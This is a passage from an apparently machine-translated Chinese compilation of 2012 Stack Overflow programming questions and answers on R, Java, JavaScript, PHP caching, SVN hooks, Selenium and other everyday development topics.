我正在尝试编写一个 for 循环，该循环将按人员 ID 获取数据帧的子集，然后将 EXAMDATE 变量滞后一个以进行比较。因此，给定的行将具有原始的 EXAMDATE 以及一个变量 EXAMDATE_LAG，它将包含 EXAMDATE 前一行的值。

```
for (i in length(uniquerid))
{
    temp <- subset(part2test, RID==uniquerid[i])
    temp$EXAMDATE_LAG <- temp$EXAMDATE
    temp2 <- data.frame(lag(temp, -1, na.pad=TRUE))  
    temp3 <- data.frame(cbind(temp,temp2))
} 
```

似乎我创建新变量很好，但我知道延迟将无法正常工作，因为我缺少步骤。也许我也误解了其他人关于如何使用滞后功能的例子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:16:21.993

这样才能完全回答。您的代码有一些问题。卢卡诺指出了一个问题。每次通过您的循环，您都将创建`temp`、`temp2`和`temp3`（或覆盖旧的）。因此，您将只剩下最后一次循环的输出。

但是，这不是需要循环的东西。相反，您可以利用`R`

```
x <- 1:10

> c(x[-1], NA)
 [1]  2  3  4  5  6  7  8  9 10 NA 
```

因此，如果您将该概念与像`plyr`这样可以很好地拆分数据的库结合起来，您应该有一个可行的解决方案。如果我遗漏了什么或者这不能解决您的问题，请提供一个[可重现的示例](https://stackoverflow.com/questions/5963269/how-to-make-a-great-r-reproducible-example)。

```
library(plyr)
myLag <- function(x) {
  c(x[-1], NA)
}

ddply(part2test, .(uniquerid), transform, EXAMDATE_LAG=myLag(EXAMDATE)) 
```

您也可以在 base R using`split`或`data.table`使用其`by=`参数的包中执行此操作。

# java - 当连接为 http 时 request.isSecure() 返回 true

> ID：12429782
> 
> 赞同：0
> 
> 时间：2012-09-14T18:09:44.780
> 
> 标签：java, ajax, http, jsp, https

我正在尝试检查我的网址是否为 http/https，然后根据第一个下拉列表中选择的值进行 AJAX 调用以填充多个下拉列表。

```
var baseurl="<%=request.isSecure()%>";

if (baseurl=='true') {
    var url = 
        "https://<%=request.getServerName()%><%=request.getContextPath()%>/JsonLookup?z=" + zone;    
}
// if the protocol is 'http' 
else 
{   
    alert("inside protocol else");
    var url = "http://<%=request.getServerName()%><%=request.getContextPath()%>/JsonLookup?z=" + zone;  
    alert("inside http:"+url);
} 
```

当协议是 http 时我有问题，下拉列表不会改变。原因是，基本 url (isSecure()) 总是返回 true，即使它是 http。

谁能帮我解决这个问题，我到底应该怎么做才能使 request.isSecure() 为 http 返回 false？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:24:42.077

你不能使用没有主机名的引用吗？

```
/path/to/resource 
```

代替

```
http://myserver.com/path/to/resource 
```

编辑：

您的示例如下所示：

```
var url = "/<%=request.getContextPath()%>/JsonLookup?z=" + zone;
alert("My root relative URL: "+url); } 
```

# node.js - Cassandra-client 不会插入

> ID：12429789
> 
> 赞同：1
> 
> 时间：2012-09-14T18:10:34.833
> 
> 标签：node.js, cassandra

我不确定为什么这行不通。我的表很简单（我什至暂时将所有内容都更改为 varchar），如果我使用 cqlsh，我可以插入。

```
 var Connection = require('cassandra-client').Connection;
    var db = new Connection({host: 'cassbx01.qualcomm.com', port: 9160, keyspace: 'foursq'});

    db.execute("INSERT INTO checkins (fqid, name, address, city, state, zip, country, lat, lng, hereNow) values ( ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
[value.id, value.name, value.location.address, value.location.city,
value.location.state, value.location.postalCode, value.location.country,
value.location.lat, value.location.lng, value.hereNow.count], 
function (err) {
   if (err || !saved) {
     throw err;
   }
}); 
```

运行时出现以下错误：

```
 self.client.execute_cql_query(cql, ttypes.Compression.NONE, function(err, 
                ^
TypeError: Cannot call method 'execute_cql_query' of null
    at Connection.execute (/usr2/lsacco/nodejs/foursq-poc/node_modules/cassandra-client/lib/driver.js:407:17)
    at exports.poller (/usr2/lsacco/nodejs/foursq-poc/controller/api.js:80:29)
    at Array.forEach (native)
    at Function._.each._.forEach (/usr2/lsacco/nodejs/foursq-poc/node_modules/underscore/underscore.js:76:11)
    at IncomingMessage.exports.poller (/usr2/lsacco/nodejs/foursq-poc/controller/api.js:77:19)
    at IncomingMessage.EventEmitter.emit (events.js:115:20)
    at IncomingMessage._emitEnd (http.js:366:10)
    at HTTPParser.parserOnMessageComplete [as onMessageComplete] (http.js:149:23)
    at CleartextStream.socketOnData [as ondata] (http.js:1366:20)
    at CleartextStream.CryptoStream._push (tls.js:495:27) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T21:51:11.130

您需要先启动与`connect`函数的连接，然后才能在回调中执行 CQL。

一个简单的示例如下所示：

```
var Connection = require('cassandra-client').Connection;
var db = new Connection({host: '127.0.0.1', port: 9160, keyspace: 'foursq'});
db.connect(function(err) {
  if (err) {
    throw err;
  } else {
    db.execute('INSERT INTO people (key, name) VALUES (?, ?)', ['key1', 'paul'],
      function (err) {
        if (err) {
          throw err;
        } else {
          console.log('success!');
        }
    });
  }
}); 
```

# d3.js - 如何从 YUI3 加载 d3.js

> ID：12429791
> 
> 赞同：0
> 
> 时间：2012-09-14T18:10:43.120
> 
> 标签：d3.js, yui3

如何从 YUI3 加载 d3.js？

我知道如何加载本机 YUI 模块，但我不确定如何加载外部模块/库。

```
YUI().use("node", function(Y){
    //initialization code
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T20:42:09.553

你需要配置 YUI，所以他知道在哪里可以找到它。

默认情况下，加载器会在 yui 种子文件所在的位置查找脚本。要更改将下载特定脚本 (d3) 的位置，您需要定义一个组。

一个组具有“base”，即下载其模块的基本路径。

因此，您使用模块 d3 定义了一个组“d3”。

```
YUI({
groups: {
  "d3lib": {
    base: "http://d3js.org/",  //the modules of this group will be downloaded from there
    modules: {
      "d3": {
        path:"d3.v2.js"   // base + path = http://d3js.org/d3.v2.js
      },
      "d3fake": {  //another module of the "d3lib" group
        path:"d3fake.js"  
      }
    }
  }
 }
}).use("d3", function (Y) {
   //d3 is available and ready to use!
  }
}); 
```

您可以查看以下链接，它们在其中加载了一些 yui2 模块（原理相同）。 [http://yuilibrary.com/yui/docs/yui/loader.html#example-config](http://yuilibrary.com/yui/docs/yui/loader.html#example-config)

# c# - 如何使用c#动态更改xml节点的属性

> ID：12429792
> 
> 赞同：3
> 
> 时间：2012-09-14T18:10:46.820
> 
> 标签：c#, xml, xmlnode, xml-attribute

我有将用户数据保存到 xml 文档的 ac# 应用程序。我希望能够根据用户在文本框中输入不同的标准并选择保存/覆盖现有文件保存来动态更改 xml 节点的属性。问题是我不能简单地删除节点并使用新属性重新创建它，因为节点具有无法删除的子节点。

有没有人有任何想法或建议？

XmlNode.Attributes 方法没有提供一种方法，因为我可以告诉它只删除节点的属性并重新分配它。不过我可能是错的。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-14T18:21:52.387

将您的节点转换为 XmlElement 并使用该`element.SetAttribute(...);`方法。

```
((XmlElement)node).SetAttribute("name", "value"); 
```

另外，如果您知道该属性已经存在，我相信有一种方法可以在没有演员表的情况下做到这一点：

```
node.Attributes["name"].Value = "value"; 
```

# java - Selenium 可以截取 JUnit 测试失败的屏幕截图吗？

> ID：12429793
> 
> 赞同：21
> 
> 时间：2012-09-14T18:10:51.890
> 
> 标签：java, selenium, junit, junit4, selenium-webdriver

当我的测试用例失败时，尤其是在我们的构建服务器上，我想拍摄屏幕的图片/屏幕截图，以帮助我调试后来发生的事情。我知道如何截屏，但我希望在 JUnit 中有一种`takeScreenshot()`方法可以在测试失败时在浏览器关闭之前调用我的方法。

不，我不想去编辑我们无数的测试来添加一个 try/catch。我想，我可能会，只是可能会被说成注释。我所有的测试都有一个共同的父类，但我想不出我能做些什么来解决这个问题。

想法？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-18T04:24:45.320

一些快速搜索让我明白了这一点：

[http://blogs.steeplesoft.com/posts/2012/grabbing-screenshots-of-failed-selenium-tests.html](http://blogs.steeplesoft.com/posts/2012/grabbing-screenshots-of-failed-selenium-tests.html)

基本上，他建议创建一个 JUnit4 `Rule`，将测试包装`Statement`在他调用的 try/catch 块中：

```
imageFileOutputStream.write(
    ((TakesScreenshot) driver).getScreenshotAs(OutputType.BYTES)); 
```

这对你的问题有用吗？

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-10-13T20:48:05.663

如果您想将此行为快速添加到运行中的**所有**测试中，您可以使用该`RunListener`接口来侦听测试失败。

```
public class ScreenshotListener extends RunListener {

    private TakesScreenshot screenshotTaker;

    @Override
    public void testFailure(Failure failure) throws Exception {
        File file = screenshotTaker.getScreenshotAs(OutputType.File);
        // do something with your file
    }

} 
```

像这样将侦听器添加到您的测试运行器...

```
JUnitCore junit = new JUnitCore();
junit.addListener(new ScreenshotListener((TakesScreenShots) webDriver));

// then run your test...

Result result = junit.run(Request.classes(FullTestSuite.class)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-07-05T10:08:31.330

如果要对测试失败进行截图，请添加此类

```
import java.io.File;

import java.io.IOException;

import java.util.UUID;

import org.apache.commons.io.FileUtils;

import org.junit.rules.MethodRule;

import org.junit.runners.model.FrameworkMethod;

import org.junit.runners.model.Statement;

import org.openqa.selenium.OutputType;

import org.openqa.selenium.TakesScreenshot;

import org.openqa.selenium.WebDriver;

public class ScreenShotOnFailure implements MethodRule {

    private WebDriver driver;

    public ScreenShotOnFailure(WebDriver driver){
        this.driver = driver;
    }

    public Statement apply(final Statement statement, final FrameworkMethod frameworkMethod, final Object o) {
        return new Statement() {
            @Override
            public void evaluate() throws Throwable {
                try {
                    statement.evaluate();
                } catch (Throwable t) {
                    captureScreenShot(frameworkMethod.getName());
                    throw t;
                }
            }

            public void captureScreenShot(String fileName) throws IOException {
                File scrFile = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
                fileName += UUID.randomUUID().toString();
                File targetFile = new File("./Screenshots/" + fileName + ".png");
                FileUtils.copyFile(scrFile, targetFile);
            }
        };
    }
} 
```

在所有测试之前，您应该使用此规则：

```
@Rule
public ScreenShotOnFailure failure = new ScreenShotOnFailure(driver));

@Before
public void before() {
   ...
} 
```

# facebook - 跟踪 Facebook 上链接的共享和点赞的时间戳

> ID：12429800
> 
> 赞同：0
> 
> 时间：2012-09-14T18:11:37.333
> 
> 标签：facebook, facebook-graph-api, facebook-like, facebook-sharer, restfb

我正在开发一个网站，有一些“facebook like”按钮。如果有人喜欢我网站主页中的链接之一，它会发布在相应人的墙上，我会得到 post_id。我想跟踪发布的链接上完成的所有活动（即喜欢、评论、分享）。

1.  我能够跟踪评论和喜欢到第一级（即，如果有人共享链接，那么我无法跟踪共享链接的相关喜欢/评论）。

2.  如果不止一个人喜欢我主页上的同一个链接，我将通过 post_id 单独跟踪，有没有什么方法可以通过链接本身进行跟踪，这样无论谁喜欢我的网站，我都会得到喜欢和评论的详细信息。

3.  是否可以获得喜欢的时间戳（当一个人喜欢共享链接时）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:43:11.267

1.  您可以请求“manage_notifications”权限，这将允许您阅读他们的通知。当有人喜欢或分享他们的帖子时，用户需要启用通知（默认情况下是这种情况）。通知对象包括其他朋友的 id。更多信息：[https ://developers.facebook.com/docs/reference/fql/notification/](https://developers.facebook.com/docs/reference/fql/notification/)

2 和 3：您可以使用 javascript 并获取用户的 fb ID 以及页面本身的时间并对其进行处理（这应该可以）：

```
 FB.Event.subscribe('edge.create',
      function(response) {
        msg = "user id " + response.authResponse.userID + "liked this page at" + Date();
        console.log(msg);
       }
    ); 
```

更多信息[https://developers.facebook.com/docs/reference/javascript/FB.Event.subscribe/](https://developers.facebook.com/docs/reference/javascript/FB.Event.subscribe/)

# r - ggplot 创建相关图

> ID：12429803
> 
> 赞同：2
> 
> 时间：2012-09-14T18:12:09.423
> 
> 标签：r, ggplot2

我正在尝试使用以下方法创建变量之间的线性相关图`ggplot2`：

```
dput(sum)
structure(list(Date = structure(c(15218, 15248, 15279, 15309, 
15340, 15371, 15400, 15431, 15461, 15492, 15522, 15553), class = "Date"), 
    Teams = c(87, 142, 173, 85, 76, 76, 93, 49, 169, 139, 60, 
    120), Scores = c("67101651", "62214988", "63183320", "66750198", 
    "61483322", "67546775", "75290893", "60713372", "77879142", 
    "70290302", "83201853", "83837301")), .Names = c("Date", 
"Teams", "Scores"), row.names = c(NA, 12L), class = "data.frame") 
```

这是我的命令：

```
ggplot(sum, aes(x = Scores, y = Teams, group=1)) + 
    geom_smooth(method = "lm", se=TRUE, size=2, formula = lm(Teams ~ Scores)) 
```

我收到此错误：

```
Error in eval(expr, envir, enclos) : object 'Teams' not found 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:15:56.203

如果要指定公式，例如线性模型，请使用`y ~ poly(x, 1)`。`formula`只要您想要一个简单的线性回归，就不需要更改参数（它是 的默认值`method = "lm"`）：

```
ggplot(sum, aes(x = Scores, y = Teams, group = 1)) +
  geom_smooth(method = "lm", formula = y ~ poly(x, 1), se = TRUE, size = 2) 
```

如果您不希望此变量为分类变量，我还建议您使用`Scores`数值 ( )。`as.numeric(Scores)`这将改变回归线。

`Score`作为分类变量：

![分类的](../Images/341afcf7428a8c412953cba14351ad5e.png)

`Score`作为数字变量：

![数字](../Images/51eed28bf76d9243b2a05a1006fa9956.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2021-01-23T21:51:50.960

`stat_cor`这是从`ggpubr`包中使用的另一个选项。此代码将绘制您的点并显示相关性和 p 值。如果您有非正常数据，您可以将“pearson”更改为“spearman”。

```
ggplot(sum, aes(x = Scores, y = Teams, group = 1)) +
  geom_point(aes()) +
  geom_smooth(method = "lm", se = TRUE, size = 2) +
  stat_cor(method = "pearson", cor.coef.name = "r", vjust = 1, size = 4) 
```

# windows - svn，在提交之前从专有格式中提取源代码

> ID：12429808
> 
> 赞同：1
> 
> 时间：2012-09-14T18:12:58.903
> 
> 标签：windows, svn, tortoisesvn

我有一个用 IDE 编写的相当大的软件项目，它将源文件存储在具有专有格式的压缩存档文件中。

我想将源代码置于版本控制之下（ TortoiseSVN / SlikSvn, Windows ）

不幸的是，如果不首先以纯文本格式导出文件，就没有简单的方法来进行**比较**，并且文件比较对于开发非常重要。

我有一个提取工具，但速度相对较慢。

如何在提交前仅导出修改/添加的文件？

我被告知在这种情况下做一个**预提交钩子是***非常糟糕*的（见[http://svnbook.red-bean.com/en/1.5/svn.reposadmin.create.html#svn.reposadmin.create.hooks](http://svnbook.red-bean.com/en/1.5/svn.reposadmin.create.html#svn.reposadmin.create.hooks) )

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T20:35:03.387

你可以编写一个 TortoiseSVN Start-commit 钩子。[请参阅 TortoiseSVN 文档](http://tortoisesvn.net/docs/nightly/TortoiseSVN_en/tsvn-dug-settings.html#tsvn-dug-settings-hooks)。这将在开发人员的机器而不是服务器上执行。该脚本将从存档中提取所有文件，然后提交除存档文件之外的所有文件。当您进行更新时，您只会更新存档文件。当你想对一个档案做差异分析时，你可以在 TortoiseSVN 中为档案文件扩展名设置一个自定义差异工具。diff 工具可以是一个脚本，它提取文件然后将它们与 repo 中文件的提取版本进行比较。查看存储库浏览器中的差异时，请查看提取的文件而不是存档。

提交不适用于 SlikSVN。如果你需要做命令行提交，你可以使用 TortoiseProc.exe 而不是 SlikSVN，这样你的 start-commit 钩子就会运行。**

# excel - 是否可以创建 OptionButton 开关效果？

> ID：12429810
> 
> 赞同：0
> 
> 时间：2012-09-14T18:13:05.137
> 
> 标签：excel, vba

像这样的东西：

```
Private Sub opt01_Click()
If opt01.Value = True Then
opt01.Value = False
Else
opt01.Value = True
End If 
```

它会适合我的formDesign，而不是寻找和导入一些类似的小图片。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:21:14.993

因为当 Click 事件运行时，OptionButton 的值始终为 true，所以您需要将其所需的值存储在变量中。这是一个在工作表 1 上名为选项按钮 1 的工作表中使用表单控件选项按钮的示例。此方法存储在模块中。

```
Private optionClicked As Boolean
Sub OptionButton1_Click()
    Dim o As OptionButton
    Set o = Sheets(1).Shapes("Option Button 1").OLEFormat.Object
    o.Value = Not optionClicked
    optionClicked = Not optionClicked
End Sub 
```

但是请注意，使用此方法，单击任何选项按钮将使所有其他选项按钮变为假。因此，要将多个选项按钮用作复选框，您需要存储选项按钮的正确值（可能在数组中）......并在每次单击任何选项按钮时更正这些值。

您确定不能使用复选框吗？

# php - 缓存一个完全动态的网站

> ID：12429811
> 
> 赞同：2
> 
> 时间：2012-09-14T18:13:09.560
> 
> 标签：php, linux, caching

我创建了一个拥有超过 20,000 个页面的动态站点，一旦创建了一个页面，至少一个月甚至一年都不需要更新它。所以我在第一次创建页面时缓存每个页面，然后从静态`html`页面传递它

我正在运行一个 php 脚本（整个 CMS 在 PHP 上） ，首先从**cache-files**`if (file_exists($filename))`目录中的 url 搜索文件名，如果匹配，则交付它，否则生成页面并缓存它以供以后使用。虽然它是动态的，但我的 url 仍然不包含，我正在这样做并将其分解为数组。**`?&=``-`**

 **我想知道的是从那个巨大的目录中搜索文件会产生任何问题吗？

我看到了一些这样的 Q/A [，](http://www.frank4dd.com/howto/various/maxfiles-per-dir.htm)它说我可以存储在目录中的文件数量应该没有问题`ext2 or ext3`（我猜我的服务器有 ext3）文件系统，但是创建新文件的速度会在之后迅速下降有超过 20-30,000 个文件。

目前我在一个共享主机上，我必须缓存文件。我在整个盒子中托管了 100,000 个文件的软限制，到目前为止这已经足够了。

有人可以给我任何关于如何缓存网站的更好的想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:23:15.850

您不应该将所有 20K 文件放在一个目录中。

将它们划分为目录（例如按字母），以便您访问：

```
a/apple-pie-recipe
j/john-doe-for-presidency 
```

等等

这将允许您以更少的文件系统限制放置更多文件，从而提高速度。（由于 FS 不需要找出您的文件在目录中的位置以及其他 20k 文件，它需要查找大约一百个）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T19:20:14.117

> 我可以使用 ext2 或 ext3 存储在目录中的文件数量应该没有问题

那是一个相当旧的文档——ext2 和 ext3 之间有两个很大的区别——日志是一个，另一个是目录的 H-TREE 索引（这减少了在同一目录中存储大量文件的影响）。虽然将日志添加到 ext2 文件系统并将其挂载为 ext3 很简单，但这并没有提供 dir_index 的好处——这需要完整的 fsck。

无论文件系统如何，使用嵌套目录结构使系统更易于管理和可扩展 - 并避免旧文件系统的性能问题。

（自从我开始写这篇文章并看到其他人提出了类似的建议后，我正在做另外 3 件事 - 但是 Madara 的方法并没有给出均匀平衡的树，OTOH 具有语义路径可能更可取）

例如

```
define('GEN_BASE_PATH','/var/data/cache-failes');
define('GEN_LEVELS', 2);

function gen_file_path($id) 
{
   $key=md5($id);
   $fname='';
   for ($x=0; $x<=GEN_LEVELS; $x++) {
       $fname=substr($key, 0, 1) . "/";
       $key=substr($key,1);
   }  
   return GEN_BASE_PATH . "/" . $fname . $key; 
} 
```

然而，解决问题的真正方法是使用正确的标头提供内容，并在网络服务器前面运行缓存反向代理（尽管这对于容量非常小的站点实际上并不实用）。**

# c - 闪烁 - 无法编译诱饵示例

> ID：12429813
> 
> 赞同：2
> 
> 时间：2012-09-14T18:13:13.040
> 
> 标签：c, scintilla

我正在尝试从 Scintilla 网站编译[诱饵示例。](http://www.scintilla.org/bait.zip)我有零运气让它编译。我可以很好地编译 scintilla 本身，也可以编译 scite，但 bait 是另一回事。当我尝试使用提供的 Makefile 进行编译时，出现以下错误：

```
bait.c:1:21: fatal error: gtk/gtk.h: No such file or directory 
```

我有 GTK，并使用不同版本的它。我试过了，我做什么似乎并不重要。我已经在互联网上寻求帮助，在手册页之后阅读手册页，但我无法弄清楚问题是什么。如果我没有得到那个错误，那么我只会得到另一个。

这是原始的makefile：

```
.SUFFIXES: .c .o .h .a

INCLUDEDIRS=-I../scintilla/include
CXXFLAGS= -DGTK -DSCI_LEXER -W -Wall
LEXEROBJS=$(wildcard ../scintilla/gtk/Lex*.o)

all: bait

shiz:
gcc `pkg-config --cflags gtk+-2.0` $(INCLUDEDIRS) $(CXXFLAGS) -c $< -o $@
bait: bait.o $(LEXEROBJS) ../scintilla/bin/scintilla.a
gcc `pkg-config --libs gtk+-2.0 gthread-2.0` -lstdc++ -DGTK $^ -o $@
clean:
rm -rf bait *.o 
```

我也尝试过使用 codebrainz 的 GtkScintilla。我什至无法完成这项工作。我总是收到上述错误或错误提示：

```
fatal error: gtk/gtk.h: No such file or directory 
```

我真的很感激这方面的任何帮助。谢谢你。

编辑：我正在使用 Linux Mint

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:10:45.770

回到这个......如果你已经解决了这个问题，请告诉我。它开始看起来是这样的麻烦多于它的价值。:)

这就是我所做的：

1.  在我的虚拟盒子上安装 Mint 13
2.  libgtk-3-dev（和支持包）
3.  验证我可以用`pkg-config --cflags --libs gtk+-3.0`
4.  找到 gtk.h ( `/usr/include/gtk-3.0/gtk/gtk.h`) 和支持文件
5.  下载的诱饵示例

以下是问题：

1.  bait 的 Makefile 引用了 gtk+-2.0，您需要将其更改为 3.0
2.  bait 的 Makefile 要求您在特定目录中构建（注意`INCLUDEDIRS`需要您在 scintilla 目录中
3.  存档 scintilla.a 需要构建（未提供，bait.o 需要它）
4.  构建存档需要您修改 makefile（注释掉这些行：

    `ifdef GTK3` `else` `GTKVERSION=gtk+-2.0` `endif`

5.  一旦你解决了这个问题并建立了档案，就会有大约一百万个未定义的引用：`ScintillaGTK.cxx:(.text+0x1374)`等等。

反正。我会再给它一点时间，如果你自己关闭这个问题，请告诉我！

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-01-07T00:54:05.547

我已经完成了这个makefile

```
##### Makefile #####
# Make file for bait on Linux or compatible OS
# Released to the public domain 2000 by Neil Hodgson neilh@scintilla.org
# This makefile tested with GCC 3.2 and GNOME 2.0

.SUFFIXES: .c .o .h .a

ifdef GTK3
GTKVERSION=gtk+-3.0
else
GTKVERSION=gtk+-2.0
endif

INCLUDEDIRS=-I../scintilla/include
CXXFLAGS= -DGTK -DSCI_LEXER -W -Wall
LEXEROBJS=$(wildcard ../scintilla/gtk/Lex*.o)

all: bait

.c.o:
    gcc `pkg-config --cflags $(GTKVERSION)` $(INCLUDEDIRS) $(CXXFLAGS) -c $< -o $@
bait: bait.o $(LEXEROBJS) ../scintilla/bin/scintilla.a
    gcc -DGTK $^ -o $@ -lstdc++ `pkg-config --libs $(GTKVERSION) gthread-2.0` -lm -lgmodule-2.0
clean:
    rm -rf bait *.o 
```

# vb.net - VB.NET 窗体调整大小

> ID：12429815
> 
> 赞同：0
> 
> 时间：2012-09-14T18:13:20.667
> 
> 标签：vb.net, winforms, controls

下午好。我在调整表单中列表视图的大小时遇到​​问题。

如您在图像中看到的，在正常位置，列表视图被正确放置。 ![普通的](../Images/b76e77775e0fd0ea6a96df839ffaa802.png)

当我最大化表单时，我在顶部控件和列表视图之间获得了巨大的空间。

![在此处输入图像描述](../Images/665106370ddb5e69026cad9198a868db.png)

我该如何解决这种情况，以便列表视图可以扩展并保持在其他控件附近？

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:14:53.010

将 ListView 的`Anchor`属性设置为所有四个边。

# java - 显式锁定是否会自动提供内存可见性？

> ID：12429818
> 
> 赞同：15
> 
> 时间：2012-09-14T18:13:37.050
> 
> 标签：java, multithreading, concurrency

示例代码：

```
class Sample{
    private int v;
    public void setV(){
        Lock a=new Lock();
        a.lock();
        try{
            v=1;
        }finally{
            a.unlock();
        }
    }
    public int getV(){
        return v;
    }
} 
```

如果我有一个线程不断调用 getV 并且我只在另一个线程中执行一次 setV ，那么该读取线程是否保证在写入后立即看到新值？还是我需要使“V”易失或原子参考？

如果答案是否定的，那么我应该将其更改为：

```
class Sample{
    private int v;
    private Lock a=new Lock();
    public void setV(){
        a.lock();
        try{
            v=1;
        }finally{
            a.unlock();
        }
    }
    public int getV(){
        a.lock();
        try{
            int r=v;
        }finally{
            a.unlock();
        }
        return r;
    }
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T18:23:52.050

从[文档](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/locks/Lock.html)中：

> 所有 Lock 实现必须强制执行与内置监视器锁提供的相同的内存同步语义：
> 
> *   成功的锁定操作就像成功的 monitorEnter 操作
> *   成功的解锁操作就像成功的 monitorExit 操作

如果您`Lock` **在两个线程中**使用（即读取和写入线程），读取线程将看到新值，因为`monitorEnter`刷新缓存。否则，您需要声明该变量`volatile`以在读取线程中强制从内存中读取。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:20:10.950

根据布赖恩定律...

> 如果您正在写入一个可能接下来被另一个线程读取的变量，或者读取一个可能最后被另一个线程写入的变量，则必须使用同步，此外，读取器和写入器都必须使用相同的监视器锁进行同步.

**所以同步setter和getter是合适的......**

**或者**

**如果您想避免**`AtomicInteger.incrementAndGet()`该块（即同步块） ，请改用**`lock-unlock`**

 *** * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-12-21T14:29:46.630

> 如果我有一个线程不断调用 getV 并且我只在另一个线程中执行一次 setV ，那么该读取线程是否保证在写入后立即看到新值？

不，读取线程可能只是读取了自己的值的副本（由正在运行读取线程的 CPU 内核自动缓存）`V`的值，因此无法获得最新的值。

> 还是我需要使“V”易失或原子参考？

是的，它们都有效。

使`V`volatile 简单地阻止 CPU Core 缓存`V`的值，即对变量的每次读/写操作都`V`必须访问主内存，这比较慢（比从 L1 Cache 读取慢大约 100 倍，详情请参阅[interaction_latency](https://people.eecs.berkeley.edu/~rcs/research/interactive_latency.html)）

使用`V = new AtomicInteger()`有效，因为在内部`AtomicInteger`使用 a`private volatile int value;`来提供可见性。

而且，如果您在读写线程（就像您的第二个代码段那样）上使用锁（`Lock`对象、块或方法；它们都有效），它也可以工作，因为（根据[Java ® 虚拟机规范的第二版](https://docs.oracle.com/javase/specs/jvms/se6/html/Threads.doc.html)第 8.9 节)`synchronized`

> ...锁定任何锁在概念上会刷新线程工作内存中的所有变量，解锁任何锁会强制将线程分配的所有变量写入主内存...
> 
> ...如果线程仅在锁定特定锁之后和相应解锁该相同锁之前使用特定共享变量，则线程将在锁定操作之后从主内存中读取该变量的共享值，如果需要，并且将在解锁操作之前将最近分配给该变量的值复制回主存储器。这与锁的互斥规则相结合，足以保证值通过共享变量从一个线程正确传输到另一个线程......

PS这些`AtomicXXX`类还提供`CAS`（比较和交换）操作，这对多线程访问很有用。

PPS 关于这个主题的 jvm 规范自 Java 6 以来没有改变，因此它们不包含在[java 7、8 和 9 的 jvm 规范中](https://docs.oracle.com/javase/specs/)。

PPPS 根据[这篇文章](https://mechanical-sympathy.blogspot.com/2013/02/cpu-cache-flushing-fallacy.html)，无论从每个内核的角度来看，CPU 缓存始终是一致的。您问题中的情况是由“内存排序缓冲区”引起的，其中`store`&`load`指令（相应地用于从内存中写入和读取数据）可以重新排序以提高性能。详细地说，缓冲区允许一条`load`指令领先于一条较旧的`store`指令，这正是导致问题的原因（`getV()`放在前面，因此它在您在另一个线程中更改它之前读取该值）。但是，在我看来，这更难理解，因此“不同内核的缓存”（正如 JVM 规范所做的那样）可能是一个更好的概念模型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T18:19:50.133

您应该制作 volatile 或 AtomicInteger。这将确保阅读线程最终会看到更改，并且对于大多数目的来说足够接近“马上”。从技术上讲，您不需要 Lock 来进行像这样的简单原子更新。仔细看看 AtomicInteger 的 API。set()、compareAndSet() 等...都将通过原子读取线程将值设置为可见。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T18:21:59.790

显式锁、`synchronized`原子引用和`volatile`都提供内存可见性。锁定并`synchronized`为它们包围的代码块和原子引用以及`volatile`声明的特定变量执行此操作。但是，为了使可见性正常工作，读取和写入方法都应该受到同一个锁定对象的保护。

它不适用于您的情况，因为您的 getter 方法不是由保护 setter 方法的锁投射的。如果您进行更改，它将按要求工作。也只是将变量声明为`volatile`or `AtomicInteger`or`AtomicReference<Integer>`也将起作用。**

# imageresizer - 正确设置调整大小和裁剪选项

> ID：12429821
> 
> 赞同：-2
> 
> 时间：2012-09-14T18:13:53.903
> 
> 标签：imageresizer

我正在使用你的调整器工具，它工作得很好，我被困在一个地方，需要你的建议来帮助我选择正确的图像调整器设置

当图像小于浏览器窗口大小时，一切工作正常我在大于浏览器窗口时遇到问题

我正在使用以下参数 orig.jpg?width=1600&height=530&mode=crop&scale=downsizeonly

例如，考虑下面给出的纵向图像场景 浏览器窗口大小 = 1600 宽度 x 530 高度 原始图像大小 = 1024 宽度 x 768 高度

预期结果：1024 宽 x 530 高（因此它应该裁剪剩余的高度）实际结果：1600 x 530 高

高度和它的裁剪是好的，但是 1600 宽度是错误的我希望它是 1024 宽度所以图像没有质量下降

反之亦然功能我需要横向图像

我应该使用什么参数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-24T05:41:34.383

如果请求的尺寸通常不会导致 &mode=max 或 &mode=pad 的放大，那么即使在 &scale=down 时，自动裁剪也会导致放大。

这是一个已知的错误，将在未来的版本中修复。

# javascript - JavaScript 命名空间和对象创建

> ID：12429823
> 
> 赞同：3
> 
> 时间：2012-09-14T18:14:08.093
> 
> 标签：javascript, object, namespaces

我试图弄清楚为什么您可能会使用以下代码：

```
 var myObject = myObject || {}; 
```

我已经多次看到它使用过，但不明白为什么有必要这样做。感谢您的回复。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:19:22.073

人们称 JavaScript 的二进制或`||`默认运算符

```
var myObject = myObject || function(){}; 
```

是相同的

```
